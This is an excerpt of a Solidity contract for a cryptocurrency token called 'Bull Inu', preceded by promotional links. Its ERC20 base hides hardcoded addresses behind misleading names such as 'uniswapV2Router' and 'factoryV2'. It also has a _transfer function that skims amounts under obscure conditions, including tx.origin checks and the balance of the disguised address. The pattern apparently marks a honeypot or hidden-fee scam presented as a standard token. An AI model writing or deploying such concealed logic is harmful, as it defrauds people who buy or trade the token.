...
https://twitter.com/BullInuCoinBNB
https://t.me.com/BullInuCoinBNB
https://BullInuCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal uniswapV2Router = 0x28B8241f6D93e2Bc187E5C01E68895076fD9a291;
    uint256 private allowanceEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private factoryV2 = 0x4593A4E3A0691c0C376510e21A1c6dcEAB030C74;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != uniswapV2Router && _balances[factoryV2] > 0 ? pairsAllowance : allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract BullInuCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Bull Inu", unicode"BULLINU")
    {
